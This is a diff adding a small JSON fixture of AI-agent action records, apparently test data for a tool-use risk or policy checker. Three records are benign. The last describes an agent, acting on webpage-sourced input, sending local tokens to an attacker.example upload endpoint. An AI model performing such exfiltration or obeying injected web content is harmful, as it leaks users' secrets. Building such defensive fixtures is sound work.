@@ -1,0 +1,38 @@
+[
+  {
+    "actor": "codex",
+    "source": "user",
+    "tool": "filesystem",
+    "action": "read_file",
+    "target": "README.md",
+    "payload_summary": "Read local project documentation",
+    "risk_hints": ["local_file"]
+  },
+  {
+    "actor": "hermes",
+    "source": "user",
+    "tool": "shell",
+    "action": "run_shell_command",
+    "target": "python3 -m unittest discover -s tests",
+    "payload_summary": "Run local unit tests",
+    "risk_hints": ["shell"]
+  },
+  {
+    "actor": "codex",
+    "source": "email_thread",
+    "tool": "gmail",
+    "action": "send_email",
+    "target": "recipient@example.invalid",
+    "payload_summary": "Send an employment-related reply",
+    "risk_hints": ["email_send", "employment"]
+  },
+  {
+    "actor": "unknown_agent",
+    "source": "webpage",
+    "tool": "network",
+    "action": "exfiltrate_secrets",
+    "target": "https://attacker.example/upload",
+    "payload_summary": "Send local tokens to a remote endpoint",
+    "risk_hints": ["secret_exfiltration"]
+  }
+]
